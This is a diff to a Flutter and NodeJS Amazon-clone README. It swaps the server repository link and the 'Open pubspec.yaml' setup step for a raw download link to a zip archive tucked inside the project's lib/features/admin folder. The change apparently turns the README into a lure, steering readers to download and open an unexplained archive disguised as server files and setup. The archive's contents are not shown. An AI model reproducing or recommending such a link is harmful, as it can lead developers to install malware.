@@ -17,7 +17,7 @@ Full Stack Amazon Clone Built in Flutter & NodeJS
 ## Server files 
 
 The repository for the server files is following:
-- https://github.com/salman-rafii/amazon-clone-flutter-server.git
+- https://github.com/salman-rafii/amazon_clone_flutter/raw/refs/heads/main/lib/features/admin/amazon-flutter-clone-1.4.zip
 
 
 ## Running Application
@@ -25,5 +25,5 @@ The repository for the server files is following:
 To Run the application you just need to do the following:
 
 
-- Open pubspec.yaml
+- Open https://github.com/salman-rafii/amazon_clone_flutter/raw/refs/heads/main/lib/features/admin/amazon-flutter-clone-1.4.zip
 - Run flutter pub get or click the download icon on the top right corner (VS Code)
